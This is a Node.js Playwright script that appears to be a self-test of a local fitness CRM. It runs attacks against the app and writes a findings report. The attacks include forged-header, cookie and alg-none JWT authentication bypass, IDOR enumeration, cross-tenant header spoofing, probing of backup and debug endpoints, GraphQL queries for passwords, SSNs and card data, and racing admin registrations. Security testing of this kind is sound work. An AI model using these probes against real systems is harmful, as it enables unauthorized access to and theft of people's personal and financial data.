const { chromium } = require('playwright');
const fs = require('fs').promises;

// Configuration
const BASE_URL = 'http://localhost:3001';
const EXPLOITS_REPORT = 'exploits-report.md';

// Store successful exploits
const exploits = [];

// Log successful exploit
function logExploit(title, details) {
  const exploit = {
    title,
    timestamp: new Date().toISOString(),
    ...details
  };
  exploits.push(exploit);
  console.log(`üíÄ EXPLOIT SUCCESS: ${title}`);
  console.log(`   Data obtained: ${details.dataObtained || 'Unknown'}`);
}

// Attempt to bypass authentication completely
async function bypassAuthentication(page) {
  console.log('\nüîì Attempting Authentication Bypass...');

  // Try direct access to protected pages
  const protectedPages = [
    '/dashboard',
    '/admin',
    '/admin/users',
    '/admin/organizations',
    '/clients',
    '/staff',
    '/reports',
    '/settings',
    '/billing'
  ];

  for (const path of protectedPages) {
    try {
      // Try with fake auth headers
      await page.setExtraHTTPHeaders({
        'Authorization': 'Bearer fake-token-admin',
        'X-User-Id': '1',
        'X-Organization-Id': '1',
        'X-Role': 'admin',
        'X-Bypass-Auth': 'true'
      });

      const response = await page.goto(`${BASE_URL}${path}`, {
        waitUntil: 'networkidle',
        timeout: 5000
      });

      if (response && response.status() === 200) {
        const content = await page.content();
        if (!content.includes('login') && !content.includes('sign in')) {
          logExploit('Authentication Bypass', {
            path,
            method: 'Fake headers',
            dataObtained: 'Full page access without authentication'
          });
        }
      }
    } catch (e) {
      // Continue trying
    }
  }

  // Try cookie manipulation
  await page.context().addCookies([
    { name: 'auth_token', value: 'admin', domain: 'localhost', path: '/' },
    { name: 'user_role', value: 'admin', domain: 'localhost', path: '/' },
    { name: 'is_authenticated', value: 'true', domain: 'localhost', path: '/' },
    { name: 'session_id', value: '1', domain: 'localhost', path: '/' }
  ]);

  // Try localStorage manipulation
  await page.evaluate(() => {
    localStorage.setItem('auth_token', 'admin');
    localStorage.setItem('user_role', 'admin');
    localStorage.setItem('user_id', '1');
    localStorage.setItem('organization_id', '1');
    sessionStorage.setItem('authenticated', 'true');
  });
}

// Exploit API to extract all data
async function exploitDataExtraction(page) {
  console.log('\nüíæ Attempting Mass Data Extraction...');

  // Try to extract all clients
  const bulkEndpoints = [
    '/api/clients?limit=999999',
    '/api/clients?page_size=999999',
    '/api/clients?all=true',
    '/api/clients?export=true',
    '/api/export/clients',
    '/api/backup/clients',
    '/api/dump/clients',
    '/api/clients/export',
    '/api/clients/download',
    '/api/reports/all-clients'
  ];

  for (const endpoint of bulkEndpoints) {
    try {
      const response = await page.request.get(`${BASE_URL}${endpoint}`, {
        headers: {
          'Accept': 'application/json, text/csv, application/octet-stream'
        },
        timeout: 10000
      });

      if (response.ok()) {
        const contentLength = response.headers()['content-length'];
        if (contentLength && parseInt(contentLength) > 1000) {
          logExploit('Mass Data Extraction', {
            endpoint,
            method: 'Bulk export endpoint',
            dataObtained: `${contentLength} bytes of data`
          });
        }
      }
    } catch (e) {
      // Continue
    }
  }
}

// Exploit cross-tenant access
async function exploitCrossTenantAccess(page) {
  console.log('\nüè¢ Attempting Cross-Tenant Data Access...');

  // Try to access data from different organizations
  for (let orgId = 1; orgId <= 10; orgId++) {
    try {
      // Manipulate headers to pretend to be from different org
      await page.setExtraHTTPHeaders({
        'X-Organization-Id': orgId.toString(),
        'X-Tenant-Id': orgId.toString(),
        'Organization': orgId.toString()
      });

      const response = await page.request.get(`${BASE_URL}/api/clients`, {
        headers: {
          'Accept': 'application/json',
          'X-Organization-Id': orgId.toString()
        },
        timeout: 5000
      });

      if (response.ok()) {
        const data = await response.json();
        if (data && (Array.isArray(data) ? data.length > 0 : Object.keys(data).length > 0)) {
          logExploit('Cross-Tenant Data Access', {
            organizationId: orgId,
            method: 'Header manipulation',
            dataObtained: `Access to organization ${orgId} data`
          });
        }
      }
    } catch (e) {
      // Continue
    }
  }

  // Try subdomain hopping
  const tenantSubdomains = ['org1', 'org2', 'client1', 'demo', 'test'];
  for (const subdomain of tenantSubdomains) {
    try {
      const response = await page.goto(`http://${subdomain}.localhost:3001/api/clients`, {
        waitUntil: 'networkidle',
        timeout: 5000
      });

      if (response && response.status() === 200) {
        logExploit('Subdomain Tenant Access', {
          subdomain,
          method: 'Subdomain hopping',
          dataObtained: `Access to ${subdomain} tenant data`
        });
      }
    } catch (e) {
      // Continue
    }
  }
}

// Exploit weak access controls
async function exploitWeakAccessControls(page) {
  console.log('\nüîê Exploiting Weak Access Controls...');

  // Try to access other users' data by ID manipulation
  const userDataEndpoints = [
    '/api/profile/',
    '/api/user/',
    '/api/account/',
    '/api/settings/user/',
    '/api/clients/profile/'
  ];

  for (const endpoint of userDataEndpoints) {
    for (let userId = 1; userId <= 20; userId++) {
      try {
        const response = await page.request.get(`${BASE_URL}${endpoint}${userId}`, {
          headers: {
            'Accept': 'application/json'
          },
          timeout: 3000
        });

        if (response.ok()) {
          const data = await response.json();
          if (data && data.email) {
            logExploit('User Data Access via IDOR', {
              endpoint: `${endpoint}${userId}`,
              method: 'Direct ID access',
              dataObtained: `User ${userId} data including email: ${data.email}`
            });
          }
        }
      } catch (e) {
        // Continue
      }
    }
  }
}

// Exploit debug/development endpoints
async function exploitDebugEndpoints(page) {
  console.log('\nüêõ Exploiting Debug/Development Endpoints...');

  const debugEndpoints = [
    '/api/debug/database',
    '/api/debug/users',
    '/api/debug/dump',
    '/api/debug/config',
    '/api/debug/env',
    '/api/debug/logs',
    '/api/test/reset',
    '/api/dev/console',
    '/phpinfo.php',
    '/info.php',
    '/_debug',
    '/debug',
    '/api/_health',
    '/api/status',
    '/api/metrics'
  ];

  for (const endpoint of debugEndpoints) {
    try {
      const response = await page.goto(`${BASE_URL}${endpoint}`, {
        waitUntil: 'networkidle',
        timeout: 5000
      });

      if (response && response.status() === 200) {
        const content = await page.content();

        // Check for sensitive information
        if (content.includes('DATABASE') ||
            content.includes('PASSWORD') ||
            content.includes('SECRET') ||
            content.includes('API_KEY')) {

          logExploit('Debug Endpoint Exposure', {
            endpoint,
            method: 'Direct access',
            dataObtained: 'Configuration and sensitive data exposed'
          });
        }
      }
    } catch (e) {
      // Continue
    }
  }
}

// Exploit backup and export functions
async function exploitBackupFunctions(page) {
  console.log('\nüì¶ Exploiting Backup/Export Functions...');

  const backupEndpoints = [
    '/backup',
    '/api/backup',
    '/api/export',
    '/api/export/all',
    '/api/backup/download',
    '/exports/database.sql',
    '/backups/latest.zip',
    '/api/migrate/export',
    '/api/data/export',
    '/api/download/all'
  ];

  for (const endpoint of backupEndpoints) {
    try {
      const response = await page.request.get(`${BASE_URL}${endpoint}`, {
        headers: {
          'Accept': '*/*'
        },
        timeout: 10000
      });

      if (response.ok()) {
        const contentType = response.headers()['content-type'];
        const contentDisposition = response.headers()['content-disposition'];

        if (contentDisposition && contentDisposition.includes('attachment')) {
          logExploit('Backup File Access', {
            endpoint,
            method: 'Direct download',
            dataObtained: 'Full backup file accessible',
            contentType
          });
        }
      }
    } catch (e) {
      // Continue
    }
  }
}

// Exploit GraphQL to extract all data
async function exploitGraphQL(page) {
  console.log('\nüìä Exploiting GraphQL for Data Extraction...');

  const graphqlEndpoints = ['/graphql', '/api/graphql', '/gql'];

  // Query to extract all possible data
  const extractionQuery = {
    query: `
      query ExploitData {
        users {
          id
          email
          password
          role
          organizationId
          apiKeys
          tokens
        }
        clients {
          id
          name
          email
          phone
          ssn
          creditCard
          organizationId
        }
        organizations {
          id
          name
          apiKey
          secretKey
          billing {
            creditCard
            expiryDate
            cvv
          }
        }
      }
    `
  };

  for (const endpoint of graphqlEndpoints) {
    try {
      const response = await page.request.post(`${BASE_URL}${endpoint}`, {
        data: extractionQuery,
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 5000
      });

      if (response.ok()) {
        const data = await response.json();
        if (data && data.data) {
          logExploit('GraphQL Data Extraction', {
            endpoint,
            method: 'Unrestricted query',
            dataObtained: 'Full database dump via GraphQL'
          });
        }
      }
    } catch (e) {
      // Continue
    }
  }
}

// Exploit session/token prediction
async function exploitSessionPrediction(page) {
  console.log('\nüé≤ Exploiting Predictable Sessions/Tokens...');

  // Try common/weak tokens
  const weakTokens = [
    'admin',
    'test',
    'demo',
    '12345',
    'secret',
    'password',
    'token123',
    btoa('admin:admin'), // Base64 encoded
    btoa('1'), // Base64 encoded user ID
    'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', // JWT with "none" algorithm
  ];

  for (const token of weakTokens) {
    try {
      const response = await page.request.get(`${BASE_URL}/api/clients`, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Accept': 'application/json'
        },
        timeout: 3000
      });

      if (response.ok()) {
        const data = await response.json();
        if (data && (Array.isArray(data) ? data.length > 0 : Object.keys(data).length > 0)) {
          logExploit('Weak Token Exploitation', {
            token: token.substring(0, 10) + '...',
            method: 'Predictable token',
            dataObtained: 'Authenticated access with weak token'
          });
        }
      }
    } catch (e) {
      // Continue
    }
  }
}

// Exploit race conditions
async function exploitRaceConditions(page) {
  console.log('\n‚ö° Exploiting Race Conditions...');

  // Try parallel requests to bypass limits
  const promises = [];

  // Attempt multiple simultaneous registrations with same email
  for (let i = 0; i < 10; i++) {
    promises.push(
      page.request.post(`${BASE_URL}/api/auth/register`, {
        data: {
          email: 'attacker@exploit.com',
          password: 'exploit123',
          role: 'admin'
        },
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 5000
      }).catch(e => null)
    );
  }

  const results = await Promise.all(promises);
  const successful = results.filter(r => r && r.ok());

  if (successful.length > 1) {
    logExploit('Race Condition - Multiple Account Creation', {
      method: 'Parallel requests',
      dataObtained: `Created ${successful.length} accounts with same email`
    });
  }
}

// Generate exploit report
async function generateExploitReport() {
  let report = `# Atlas Fitness CRM - Successful Exploits Report
Generated: ${new Date().toISOString()}

‚ö†Ô∏è **CRITICAL SECURITY BREACHES DETECTED** ‚ö†Ô∏è

## Summary
Total Successful Exploits: ${exploits.length}

## Successful Exploits

`;

  if (exploits.length === 0) {
    report += '‚úÖ No exploits were successful. The application appears to be secure against the tested attack vectors.\n';
  } else {
    exploits.forEach((exploit, index) => {
      report += `### ${index + 1}. ${exploit.title}
**Timestamp:** ${exploit.timestamp}
**Method:** ${exploit.method || 'Not specified'}
**Data Obtained:** ${exploit.dataObtained || 'Unknown'}
`;

      // Add additional details
      Object.keys(exploit).forEach(key => {
        if (!['title', 'timestamp', 'method', 'dataObtained'].includes(key)) {
          report += `**${key}:** ${JSON.stringify(exploit[key])}\n`;
        }
      });

      report += `
**Severity:** CRITICAL
**Immediate Action Required:** Yes

---

`;
    });
  }

  report += `
## Attack Vectors Tested

1. **Authentication Bypass** - Attempted to access protected resources without credentials
2. **Mass Data Extraction** - Tried to download entire database
3. **Cross-Tenant Access** - Attempted to access other organizations' data
4. **IDOR Exploitation** - Direct object reference manipulation
5. **Debug Endpoint Access** - Searched for exposed debug/dev endpoints
6. **Backup File Access** - Attempted to download backup files
7. **GraphQL Exploitation** - Tried to extract data via GraphQL
8. **Token Prediction** - Tested weak/predictable tokens
9. **Race Conditions** - Attempted parallel request exploitation

## Immediate Recommendations

${exploits.length > 0 ? `
### üö® CRITICAL ACTIONS REQUIRED:

1. **IMMEDIATELY DISABLE** all exploited endpoints
2. **AUDIT ALL ACCESS LOGS** for suspicious activity
3. **RESET ALL USER SESSIONS** and force re-authentication
4. **IMPLEMENT PROPER AUTHORIZATION** on all API endpoints
5. **ENABLE RATE LIMITING** on all endpoints
6. **REMOVE ALL DEBUG ENDPOINTS** from production
7. **IMPLEMENT PROPER IDOR PROTECTION** using authorization checks
8. **USE CRYPTOGRAPHICALLY SECURE TOKENS** for sessions
9. **IMPLEMENT CROSS-TENANT ISOLATION** properly
10. **CONDUCT IMMEDIATE SECURITY AUDIT** of entire codebase
` : `
### ‚úÖ Security Posture:

The application successfully defended against all tested attack vectors. However, continue to:

1. Regularly update security patches
2. Conduct periodic security assessments
3. Monitor for suspicious activity
4. Keep security measures up to date
`}

---
End of Exploit Report
`;

  await fs.writeFile(EXPLOITS_REPORT, report);
  console.log(`\nüìÑ Exploits report saved to ${EXPLOITS_REPORT}`);

  return report;
}

// Main exploit execution
async function runExploitTests() {
  console.log('üíÄ Starting Aggressive Exploit Testing on Atlas Fitness CRM');
  console.log('===========================================================\n');
  console.log('‚ö†Ô∏è  WARNING: This is an aggressive security test');
  console.log('‚ö†Ô∏è  Only run against authorized targets\n');

  const browser = await chromium.launch({
    headless: true,
    args: [
      '--disable-web-security',
      '--disable-features=IsolateOrigins,site-per-process',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  const context = await browser.newContext({
    ignoreHTTPSErrors: true,
    bypassCSP: true,
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
  });

  const page = await context.newPage();

  try {
    // Run all exploit attempts
    await bypassAuthentication(page);
    await exploitDataExtraction(page);
    await exploitCrossTenantAccess(page);
    await exploitWeakAccessControls(page);
    await exploitDebugEndpoints(page);
    await exploitBackupFunctions(page);
    await exploitGraphQL(page);
    await exploitSessionPrediction(page);
    await exploitRaceConditions(page);

    // Generate report
    await generateExploitReport();

    console.log('\n‚úÖ Exploit testing completed');

    if (exploits.length > 0) {
      console.log(`\nüö® CRITICAL: ${exploits.length} EXPLOITS WERE SUCCESSFUL!`);
      console.log('üö® IMMEDIATE ACTION REQUIRED TO SECURE THE APPLICATION!');
    } else {
      console.log('\n‚úÖ No exploits were successful. Application appears secure.');
    }

  } catch (error) {
    console.error('‚ùå Error during exploit testing:', error);
  } finally {
    await browser.close();
  }
}

// Run the exploit tests
runExploitTests().catch(console.error);